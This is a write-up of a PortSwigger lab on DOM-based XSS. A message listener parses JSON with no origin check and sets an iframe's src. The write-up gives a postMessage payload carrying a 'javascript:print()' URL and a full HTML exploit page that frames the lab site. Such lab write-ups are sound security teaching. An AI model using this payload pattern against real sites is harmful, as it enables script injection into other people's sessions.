# DOM XSS using web messages and `JSON.parse`

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url), you'll learn: DOM XSS using web messages and `JSON.parse`! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab uses web messaging and parses the message as JSON. To solve the lab, construct an HTML page on the exploit server that exploits this vulnerability and calls the `print()` function.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-3/images/Pasted%20image%2020230114173227.png)

**View source page:**
```html
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```

In this web message, it has an event listener that listening for a web message. Then, it'll **parse the message as JSON data via `JSON.parse`**. Moreover, **the event listener doesn't verify the origin of incoming messages correctly.**

Also, in the `switch` statement, it has a `case` called `load-channel`. **What that case do is to change an `<iframe>` element `src` attribute**. Hence, this is the sink (Dangerous function). 

Armed with above information, we can host a malicious HTML file that contains `<iframe>` element and use the `postMessage()` method to pass web message data to the vulnerable event listener, which then sends the payload to a sink on the parent page:

```js
postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}",'*')
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-3/images/Pasted%20image%2020230114175422.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-3/images/Pasted%20image%2020230114175428.png)

**Let's create a HTML payload to exploit that DOM-based XSS!**
```html
<html>
    <head>
        <title>DOM XSS using web messages and JSON.parse</title>
    </head>
    <body>
        <iframe src="https://0a94005203448cd4c073c3ae006d003c.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\":\"javascript:print()\"}","*");'></iframe>
    </body>
</html>
```

Then host it on the exploit server, and deliver it to victim:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-3/images/Pasted%20image%2020230114175905.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/DOM-Based-Vulnerabilities/DOM-3/images/Pasted%20image%2020230114175910.png)

# What we've learned:

1. DOM XSS using web messages and `JSON.parse`